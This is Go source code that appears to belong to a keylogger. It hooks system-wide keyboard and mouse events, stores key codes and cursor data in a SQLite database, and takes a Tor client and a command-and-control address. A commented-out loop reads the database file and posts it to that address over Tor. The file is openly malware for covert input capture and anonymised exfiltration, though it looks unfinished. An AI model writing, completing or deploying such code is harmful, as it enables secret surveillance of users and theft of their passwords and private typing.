package main

import (
	"database/sql"
	"log"

	_ "github.com/mattn/go-sqlite3"

	"github.com/cretz/bine/tor"
	hook "github.com/robotn/gohook"
)

func SaveEvent(db *sql.DB, e hook.Event) (sql.Result, error) {
	return db.Exec(`INSERT INTO events (kind,rawcode,button,x,y,clicks,amount,rotation,direction,timestamp) values (?,?,?,?,?,?,?,?,?,?)`, e.Kind, e.Rawcode, e.Button, e.X, e.Y, e.Clicks, e.Amount, e.Rotation, e.Direction, e.When)
}

func CreateTable(db *sql.DB) (sql.Result, error) {
	return db.Exec(`CREATE TABLE IF NOT EXISTS events(
		id INT PRIMARY KEY,
		timestamp INT,
		kind INT,
		rawcode INT,
		button INT,
		x INT,
		y INT,
		clicks INT,
		amount INT,
		rotation INT,
		direction INT
	);`)
}

func RunHook(t *tor.Tor, cc string, db *sql.DB, ev chan hook.Event) chan error {
	errch := make(chan error, 1)
	go func() {
		for {
			select {
			case e := <-ev:
				switch e.Kind {
				case hook.KeyDown:
				case hook.KeyUp:
				case hook.KeyHold:
					_, err := SaveEvent(db, e)
					if err != nil {
						log.Println(err)
					}
				default:
					break
				}
				// case <-tick:
				// dbytes, err := os.ReadFile("./db.db")
				// if err != nil {
				// 	errch <- err
				// 	break
				// }
				// PostToURL(cc, t, dbytes)
			}
		}
	}()
	return errch
}
